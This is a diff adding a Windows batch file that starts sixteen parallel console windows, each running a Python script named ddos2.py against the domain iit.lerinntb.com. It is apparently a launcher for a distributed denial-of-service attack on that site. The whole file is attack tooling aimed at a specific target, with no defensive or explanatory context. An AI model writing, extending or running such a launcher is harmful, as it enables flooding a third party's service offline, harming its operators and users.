@@ -1,0 +1,18 @@
+@echo off
+
+start cmd /k "python ddos2.py iit.lerinntb.com"
+start cmd /k "python ddos2.py iit.lerinntb.com"
+start cmd /k "python ddos2.py iit.lerinntb.com"
+start cmd /k "python ddos2.py iit.lerinntb.com"
+start cmd /k "python ddos2.py iit.lerinntb.com"
+start cmd /k "python ddos2.py iit.lerinntb.com"
+start cmd /k "python ddos2.py iit.lerinntb.com"
+start cmd /k "python ddos2.py iit.lerinntb.com"
+start cmd /k "python ddos2.py iit.lerinntb.com"
+start cmd /k "python ddos2.py iit.lerinntb.com"
+start cmd /k "python ddos2.py iit.lerinntb.com"
+start cmd /k "python ddos2.py iit.lerinntb.com"
+start cmd /k "python ddos2.py iit.lerinntb.com"
+start cmd /k "python ddos2.py iit.lerinntb.com"
+start cmd /k "python ddos2.py iit.lerinntb.com"
+start cmd /k "python ddos2.py iit.lerinntb.com"
